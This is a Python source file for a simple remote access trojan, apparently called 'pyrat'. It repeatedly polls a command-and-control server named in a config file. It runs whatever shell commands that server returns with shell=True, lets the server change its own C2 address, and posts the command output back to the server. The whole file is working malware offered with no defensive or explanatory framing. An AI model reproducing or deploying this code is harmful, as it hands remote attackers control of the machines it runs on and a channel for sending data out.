import requests
import os
import platform
import yaml
import json
import subprocess
import time



def poll_C2(): 
    with open('config.yaml','r') as f:
        config = yaml.safe_load(f)
    url = config['server']
    r = requests.get(url)

    return r.json()

def execute(bash_command) -> str:
    bash_run = subprocess.run(bash_command, 
                   shell=True,
                   check=True, 
                   text=True,
                   stdout=subprocess.PIPE)

    return bash_run.stdout
    
def change_config(server_value):
    try:
        with open('config.yaml', 'r+') as f:
            data = yaml.safe_load(f)
            data['server'] = server_value
            yaml.safe_dump(data, f)
        result =  "OK CONFIG"
    except Exception:
        result = "ERROR CONFIG"
    return result

def notify_C2(command: dict, command_result):

    with open('config.yaml','r') as f:
        config = yaml.safe_load(f)
    server_domain = config['server']
    deactivation_url = server_domain + "command/" + command['_id'] + "/done"

    requests.get(deactivation_url)

    pyrat_result = {
        'command_id': command['_id'],
        'command_type': command['command_type'],
        'argument': command['argument'],
        'result': command_result
        }
    result_url = server_domain + "result"

    print(pyrat_result)

    requests.post(result_url,json=pyrat_result)

    return
    

def handle_command(command):
    print("Running command : " + command['_id'])
    command_type = command['command_type']
    if command_type == "execute":
        command_result = execute(command['argument'])
    elif command_type == "config":
        command_result = change_config(argument)
    else:
        command_result = "ERROR : Unknown command"

    notify_C2(command, command_result)


def main():
    running = True
    last_exec = time.time()
    
    while(running):
        now = time.time()
        if (now - last_exec) > 5:
            to_do = poll_C2()
            for cmd in to_do:
                handle_command(cmd)
            last_exec = now
        else:
            time.sleep(10)


if __name__ == "__main__":
    main()